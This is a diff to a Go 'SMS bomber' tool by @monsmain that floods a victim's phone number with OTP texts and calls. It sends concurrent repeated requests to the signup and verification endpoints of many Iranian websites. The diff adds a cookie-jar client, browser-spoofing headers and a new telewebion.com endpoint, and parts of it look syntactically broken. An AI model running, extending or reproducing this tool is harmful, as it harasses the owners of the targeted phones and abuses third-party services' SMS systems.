@@ -6,7 +6,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
-	"net"
+	"net" 
 	"net/http"
 	"net/url"
 	"os"
@@ -16,9 +16,10 @@ import (
 	"strings"
 	"sync"
 	"syscall"
-	"time"
+	"time"  
+        "net/http/cookiejar"  
 )
-
+//Code by @monsmain
 func clearScreen() {
 	cmd := exec.Command("clear")
 	if runtime.GOOS == "windows" {
@@ -28,7 +29,7 @@ func clearScreen() {
 	cmd.Run()
 }
 
-func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
+func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
 
 	const maxRetries = 3
@@ -66,7 +67,8 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 		}
 		req.Header.Set("Content-Type", "application/json")
 
-		resp, err := http.DefaultClient.Do(req)
+		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
+		resp, err := client.Do(req)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
 				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
@@ -93,8 +95,8 @@ func sendJSONRequest(ctx context.Context, url string, payload map[string]interfa
 		return
 	}
 }
-
-func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
+//Code by @monsmain
+func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
 
 	const maxRetries = 3
@@ -122,7 +124,8 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 		}
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
-		resp, err := http.DefaultClient.Do(req)
+		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
+		resp, err := client.Do(req)
 		if err != nil {
 
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
@@ -150,8 +153,8 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 		resp.Body.Close()
 		return
 	}
-} // tabe jadid hastesh
-func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
+}
+func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
 	defer wg.Done()
 
 	const maxRetries = 3
@@ -177,7 +180,8 @@ func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan
 			continue
 		}
 
-		resp, err := http.DefaultClient.Do(req)
+		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
+		resp, err := client.Do(req)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
 				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
@@ -203,24 +207,18 @@ func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan
 		resp.Body.Close()
 		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
 	}
-}
-// تابع کمکی محلی برای فرمت دهی شماره تلفن با فاصله (فقط برای سرویس payagym.com)
+}//Code by @monsmain
+//(faghat baraye site payagym.com)
 func formatPhoneWithSpaces(p string) string {
-	p = getPhoneNumberNoZero(p) // حذف صفر اول با استفاده از تابع موجود
-	// اطمینان حاصل می کنیم که حداقل ۱۰ رقم برای فرمت 912 XXX XXXX وجود دارد
+	p = getPhoneNumberNoZero(p) 
 	if len(p) >= 10 {
-		// فرض می کنیم شماره ورودی بعد از حذف صفر با 912 شروع می شود و 10 رقم دارد
-		// فرمت: 912 + 3 رقم + فاصله + 4 رقم
 		if len(p) >= 10 {
 			return p[0:3] + " " + p[3:6] + " " + p[6:10]
 		}
-		// اگر کمتر از ۱۰ رقم بود یا فرمت دیگری داشت، همان بدون صفر و بدون فاصله برمی گردانیم
 		return p
 	}
-	return p // اگر کمتر از ۱۰ رقم بود، همان بدون صفر برمی گردانیم
+	return p 
 }
-// توابع کمکی برای فرمت کردن شماره تلفن (برای استفاده داخلی در task ها)
-// چون اینها منطق ساده ای دارند و از پکیج های موجود استفاده می کنند، اضافه می شوند.
 func getPhoneNumberNoZero(phone string) string {
 	if strings.HasPrefix(phone, "0") {
 		return phone[1:]
@@ -235,56 +233,55 @@ func getPhoneNumber98NoZero(phone string) string {
 func getPhoneNumberPlus98NoZero(phone string) string {
 	return "+98" + getPhoneNumberNoZero(phone)
 }
-
 func main() {
 	clearScreen()
 
 	fmt.Print("\033[01;32m")
 	fmt.Print(`
-		                                      :-.
-		                                  .:  =#-:-----:
-		                                    **%@#%@@@#*+==:
-		                                 :=*%@@@@@@@@@@@@@@%#*=:
-		                              -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
-		                            . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
-		                          .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
-		                        =% .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
-		                       :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
-		                       #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
-		                      .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
+                                :-.                                   
+                         .:   =#-:-----:                              
+                           **%@#%@@@#*+==:                            
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
 `)
 	fmt.Print("\033[01;37m")
 	fmt.Print(`
-		                       =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
-		                       +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-		                       =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
-		                       .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-		                        #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
-		                        -@@@@*:       . -#@@@@@@#:  .       -#@@@%:
-		                        *@@%#           -@@@@@@.            #@@@+
-		                         .%@@# @monsmain +@@@@@@=  Sms Bomber #@@#
-		                         :@@* =%@@@@@@%-  faster    *@@:
-		                          #@@%        .*@@@@#%@@@%+.          %@@+
-		                          %@@@+     -#@@@@@* :%@@@@@*-       *@@@*
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+            *@@%#             -@@@@@@.            #@@@+             
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+             :@@*            =%@@@@@@%-  faster    *@@:              
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
 `)
 	fmt.Print("\033[01;31m")
 	fmt.Print(`
-		                          *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
-		                           #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
-		                            =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
-		                              .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
-		                                   #@@@@@@@@@@@@@@@@@@@@@@+
-		                                    *@@@@@@@@@@@@@@@@@@@@+
-		                                     +@@%*@@%@@@%%@%*@@%=
-		                                      +%+ %%.+@%:-@* *%-
-		                                       .  %# .%#  %+
-		                                          :.  %+  :.
-		                                               -:
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+                        +@@%*@@%@@@%%@%*@@%=                         
+                         +%+ %%.+@%:-@* *%-                          
+                          .  %# .%#  %+                              
+                             :.  %+  :.                              
+                                 -:                                  
 `)
 	fmt.Print("\033[0m")
 
 
-	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // Note: Update these counts based on the final number of added services
+	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
 	var phone string
 	fmt.Scan(&phone)
@@ -297,19 +294,22 @@ func main() {
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
 	fmt.Scan(&speedChoice)
 
-	var numWorkers int
-
-	switch strings.ToLower(speedChoice) {
+	var numWorkers int 
+//Code by @monsmain
+	switch strings.ToLower(speedChoice) { 
 	case "fast":
-		numWorkers = 100
+
+		numWorkers = 90 
 		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
 	case "medium":
-		numWorkers = 30
+
+		numWorkers = 40 
 		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
 	default:
-		numWorkers = 30
+
+		numWorkers = 40 
 		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
-	}
+	}//Code by @monsmain
 
 
 	ctx, cancel := context.WithCancel(context.Background())
@@ -323,13 +323,17 @@ func main() {
 		cancel()
 	}()
 
-	// تخمین اندازه کانال tasks: تعداد تکرار * (تعداد کل URLهای فعال)
-	tasks := make(chan func(), repeatCount*40) // 40 یک تخمین اولیه است، با توجه به تعداد URLهای اضافه شده تنظیم شود
+cookieJar, _ := cookiejar.New(nil)
+	client := &http.Client{
+		Jar: cookieJar,
+        Timeout: 10 * time.Second,
+	}
+
+	tasks := make(chan func(), repeatCount*40)
 
 	var wg sync.WaitGroup
 
-	// تخمین اندازه کانال ch: تعداد تکرار * (تعداد کل URLهای فعال)
-	ch := make(chan int, repeatCount*40) // 40 یک تخمین اولیه است
+	ch := make(chan int, repeatCount*40)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
@@ -339,7 +343,6 @@ func main() {
 		}()
 	}
 
-	// --- حلقه اصلی برای اضافه کردن وظایف ---
 	for i := 0; i < repeatCount; i++ {
 
 		// nikanbike.com (SMS - POST Form) - نیاز به rand و verify_token (ممکن است پویا باشند)
@@ -723,11 +726,63 @@ func main() {
 			sendJSONRequest(ctx, "https://api.payping.ir/v1/user/Register", payload, &wg, ch)
 		}
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// gateway.telewebion.com (SMS - POST JSON) - اضافه کردن هدرها و استفاده از client با کوکی
+		wg.Add(1)
+		tasks <- func() {
+			// ساختار payload به صورت JSON
+			payload := map[string]interface{}{
+				"code": "98",
+				"phone": getPhoneNumberNoZero(phone), // ارسال بدون صفر اول
+				"smsStatus": "default",
+			}
 
+            jsonData, err := json.Marshal(payload)
+            if err != nil {
+                fmt.Printf("\033[01;31m[-] Error while encoding JSON for telewebion.com: %v\033[0m\n", err)
+                ch <- http.StatusInternalServerError
+                return
+            }
+
+			// ساخت درخواست با context و body
+			req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", bytes.NewBuffer(jsonData))
+			if err != nil {
+				fmt.Printf("\033[01;31m[-] Error while creating request to telewebion.com: %v\033[0m\n", err)
+				ch <- http.StatusInternalServerError
+				return
+			}
+
+			// اضافه کردن هدرهای درخواستی
+			req.Header.Set("Content-Type", "application/json")
+			req.Header.Set("Accept", "application/json, text/plain, */*")
+			req.Header.Set("Accept-Language", "en-US,en;q=0.9,fa;q=0.8")
+			req.Header.Set("Origin", "https://gate.telewebion.com")
+			req.Header.Set("Referer", "https://gate.telewebion.com/")
+			req.Header.Set("Sec-Ch-Ua", "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
+			req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+			req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
+			req.Header.Set("Sec-Fetch-Dest", "empty")
+			req.Header.Set("Sec-Fetch-Mode", "cors")
+			req.Header.Set("Sec-Fetch-Site", "same-site")
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36")
+
+			// ارسال درخواست با client جدید که کوکی ها را مدیریت می کند
+			resp, err := client.Do(req) // استفاده از client به جای http.DefaultClient
+			if err != nil {
+				// مدیریت خطا
+				fmt.Printf("\033[01;31m[-] Error sending request to telewebion.com: %v\033[0m\n", err)
+				ch <- http.StatusInternalServerError
+				return
+			}
+			defer resp.Body.Close()
+
+			// گزارش وضعیت
+			ch <- resp.StatusCode
+		}
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 // gamefa.com (Register flow 2 - SMS OTP step - POST Form) - اضافه کردن digits_reg_username
 		wg.Add(1)
-		tasks <- func() { // ساختار برای پاس دادن client
+		tasks <- func(c *http.Client) func() { // ساختار برای پاس دادن client
+			return func() {
 				formData := url.Values{}
 				formData.Set("action", "digits_forms_ajax")
 				formData.Set("type", "register")
@@ -748,13 +803,12 @@ func main() {
 				// >>>>>> اضافه کردن پارامتر digits_reg_username <<<<<<
 				formData.Set("digits_reg_username", "randomuser123") // یک مقدار نمونه، میتونی از یک تابع برای تولید اسم تصادفی استفاده کنی
 
-				sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch) // ارسال c
+				sendFormRequest(c, ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch) // ارسال c
 			}
-                }
-	
-	// --- پایان حلقه اصلی ---
-
-
+		}(client) // ارسال client اصلی به تابع خارجی
+                    }
+		}
+//Code by @monsmain
 	close(tasks)
 
 	go func() {
@@ -762,7 +816,6 @@ func main() {
 		close(ch)
 	}()
 
-	// پردازش نتایج
 	for statusCode := range ch {
 		if statusCode >= 400 || statusCode == 0 {
 			fmt.Println("\033[01;31m[-] Error or Canceled!")
@@ -771,3 +824,4 @@ func main() {
 		}
 	}
 }
+//Code by @monsmain
